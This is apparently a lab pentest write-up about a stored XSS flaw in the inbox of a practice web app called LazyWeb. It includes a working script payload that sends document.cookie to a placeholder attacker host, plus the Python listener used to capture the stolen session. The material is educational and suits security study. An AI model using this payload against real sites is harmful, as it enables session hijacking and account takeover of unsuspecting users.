---
title: "LazyWeb – VULN 9: Stored Cross-Site Scripting (Stored XSS) → Session Hijacking"
date: 2026-04-14
categories: [Writeups, WebPentest, Web Exploitation]
tags: [web security, pentesting, owasp, burp suite, vulnerability]
description: Analysis of an XSS vulnerability in LazyWeb, allowing execution of malicious scripts and enabling session hijacking, potentially leading to account takeover.
image: /assets/img/lazyweb-cover1.png
--- 
## Description

The web application provides a messaging feature that allows users to send messages through the **Inbox** page. User-supplied input in the message field is stored in the database and later rendered in the web page without proper sanitization or encoding.

Because the application does not properly validate or escape user input, attackers can inject malicious JavaScript code into the message content. When another user views the message, the injected script executes in the victim's browser.

This allows attackers to perform various malicious actions such as stealing session cookies, impersonating users, and performing session hijacking.

## Discovery Process

### Step 1 — Identify Message Functionality

During testing, the **Inbox** feature was identified, which allows users to send messages to other users.

Users can input:

```
To
Subject
Message
```

These values are later displayed when viewing messages.

### Step 2 — Craft Malicious Payload

To test whether the application properly sanitizes user input, a malicious JavaScript payload was crafted to steal session cookies from the victim.

```jsx
<script>
fetch("http://IP:8000/?cookie="+document.cookie)
</script>
```

![/assets/img/imgvuln9.png](/assets/img/imgvuln9.png)

This payload attempts to send the victim's browser cookies to an attacker-controlled server.

### Step 3 — Send Malicious Message

The payload was inserted into the **Message** field in the **Send Message** form.

Once submitted, the message was stored successfully in the application.

### Step 4 — Capture Victim Cookies

A listener was started on the attacker's machine:

```bash
python3 -m http.server 8000

```

When the victim opened the malicious message through:
```
/user/inbox.php?view_id=<message_id>
```
the injected JavaScript executed in the victim's browser and sent the session cookie to the attacker-controlled server.

The attacker's server captured the following request:

![/assets/img/imgvuln9(1).png](/assets/img/imgvuln9(1).png)

This confirms that the victim's session cookies were successfully stolen.

## Impact

Successful exploitation of this vulnerability allows attackers to:

- execute arbitrary JavaScript in the victim's browser
- steal session cookies
- hijack authenticated sessions
- impersonate other users
- perform account takeover

If an attacker targets a privileged user such as an administrator, this vulnerability may lead to full system compromise.

## Severity

<span style="color: #ff922b;">**High**</span>

Stored XSS is considered high severity because the malicious payload is permanently stored in the application and automatically executed whenever the victim views the affected content.